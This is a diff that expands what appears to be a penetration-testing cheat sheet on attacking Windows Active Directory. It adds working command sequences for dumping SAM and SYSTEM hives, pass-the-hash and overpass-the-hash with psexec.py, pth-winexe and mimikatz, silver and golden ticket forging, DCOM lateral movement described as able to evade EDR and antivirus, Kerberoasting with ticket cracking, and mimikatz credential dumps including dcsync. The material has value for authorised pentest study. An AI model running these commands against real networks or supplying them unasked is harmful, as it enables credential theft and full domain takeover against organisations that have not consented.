@@ -995,6 +995,13 @@ crackmapexec 192.168.92.0/24 -u ealderson -d WHITEROSE.local -p Password123
 secretsdump.py whiterose/ealderson:Password123@192.168.92.131
 ```
 
+## Dumping SAM file and use secretsdump
+```
+reg save HKLM\SAM SAM
+reg save HKLM\SYSTEM system
+impacket-secretsdump -sam sam -system system LOCAL
+```
+
 ## Pass The Hash
 Use NTHASH (LMHASH:NTHASH)
 
@@ -1006,8 +1013,14 @@ Alternative: [pth-toolkit](https://github.com/byt3bl33d3r/pth-toolkit)
 ```
 pth-winexe -U user%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //10.10.10.22 cmd
 ```
+Or 
+```
+psexec.py domain.local/Administrator@192.168.10.10 -hashes 8c802621d2e36fc074345dded890f3e5:8c802621d2e36fc074345dded890f3e5
+```
 
-## Pass The Ticket
+## Pass The Ticket (Silver Ticket)
+The Pass the Ticket attack takes advantage of the TGS, which may be exported and re-injected elsewhere on the network and then used to authenticate to a specific service. In addition, if the service tickets belong to the current user, then no administrative privileges are required. (TGS offers more flexibility than TGT)
+
 Example SID:
 ```
   S-1-5-21-2536614405-3629634762-1218571035-1116
@@ -1023,7 +1036,9 @@ mimikatz # kerberos::golden /user:user /domain:domain.com /sid:s-1-5-21-16028755
 ```
 where /rc4 is the hash
 
-## Lateral Movement with Distributed Component Object Model (DCOM)
+## Lateral Movement with Distributed Component Object Model (DCOM) 
+i: Requires access to TCP 135 for DCOM and TCP 445 for SMB. Relatively new vector. May avoid some detection system like EDR/NDR/AV.
+
 The Microsoft Component Object Model (COM) is a system for creating software components that interact with each other. While COM was created for either same-process or cross-process interaction, it was extended to Distributed Component Object Model (DCOM) for interaction between multiple computers over a network.
 
 Discover available methods from a DCOM object. In this example Excel.
@@ -1073,15 +1088,26 @@ $Workbook = $com.Workbooks.Open("C:\myexcel.xls")
 $com.Run("mymacro")
 ```
 
-## Shell Access Whith NTLM Hash
+## Shell Access With NTLM Hash (pass the hash)
+If you retreive the NTLM hash simply paste it as lmhash and nthash:
+ntlm: 8c802621d2e36fc074345dded890f3e5 => 8c802621d2e36fc074345dded890f3e5:8c802621d2e36fc074345dded890f3e5
 
 ```
 psexec.py -u "Elliot Alderson":@192.168.92.131 -hashes <lmhash:nthash>
+psexec.py domain.local/Administrator@192.168.10.10 -hashes 8c802621d2e36fc074345dded890f3e5:8c802621d2e36fc074345dded890f3e5
 ```
 Or
 ```
+# Overpass the hash
 mimikatz # sekurlsa::pth /user:user /domain:domain.com /ntlm:e2b475c11da2a0748290d87aa966c327 /run:PowerShell.exe
+PS C:\> net use \\dc01
+PS C:\> .\psexec.exe \\dc01 cmd.exe
 ```
+Or
+```
+pth-winexe -U Administrator%<nthash>:<lmhash> //10.10.10.10 cmd
+```
+
 Windows:
 Create a TGT Kerberos ticket first by issuing a command that requires domain permissions (net use \\dc01)
 ```
@@ -1099,6 +1125,7 @@ meterpreter> impersonate_token marvel\\administrator
 ```
 
 ## Kerberoasting
+Enumerate SPN's and request a service ticket. Decrypting ticket by brute forcing provides the password hash which can be cracked to retreive the password in clear text.
 
 :information_source: GetUserSPNs.py is part of the impacket toolkit
 
@@ -1115,6 +1142,9 @@ Domain Controller->Application Server: (opt.) PAC Validation response
 ```
 
 ### Get Kerberos Service Ticket by SPN
+When requesting the service ticket from the domain controller, no checks are performed on whether the user has any permissions to access the service hosted by the service principal name. These checks are performed as a second step only when connecting to the service itself. This means that if we know the SPN we want to target, we can request a service ticket for it from the domain controller. Then, since it is our own ticket, we can extract it from local memory and save it to disk.
+
+
 Powershell script:
 ```
 Add-Type -AssemblyName System.IdentityModel
@@ -1138,7 +1168,7 @@ Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASC
 
 ### Cracking Service Ticket
 Since the service ticket is encrypted with the service accounts password hash, we can bruteforce this with a wordlist
-This is also possible with john the ripper or hashcat
+This is also possible with john the ripper or hashcat (which is a lot faster)
 ```
 sudo apt update && sudo apt install kerberoast
 python /usr/share/kerberoast/tgsrepcrack.py wordlist.txt ticket.kirbi 
@@ -1193,7 +1223,7 @@ mimikatz # sekurlsa::logonpasswords
 mimikatz # lsadump::sam 
 mimikatz # lsadump::sam /patch
 mimikatz # lsadump::lsa /patch
-mimikatz # lsadump::dcsync /user:Administrator
+mimikatz # lsadump::dcsync /user:Administrator # domain admin privilege needed, triggers domain controller synchronization (NTDS.dit)
 ```
 
 ### Golden Ticket Attack
@@ -1201,7 +1231,8 @@ When a user submits a request for a TGT, the KDC encrypts the TGT with a secret 
 
 ```
 mimikatz # privilege::debug
-mimikatz # lsadump::lsa /inject /name:krbtgt
+mimikatz # lsadump::lsa /inject /name:krbtgt 
+# look for NTLM hash for User krbtgt
 ```
 
 Copy S-ID of the domain and NTLM hash of TGT-Account.
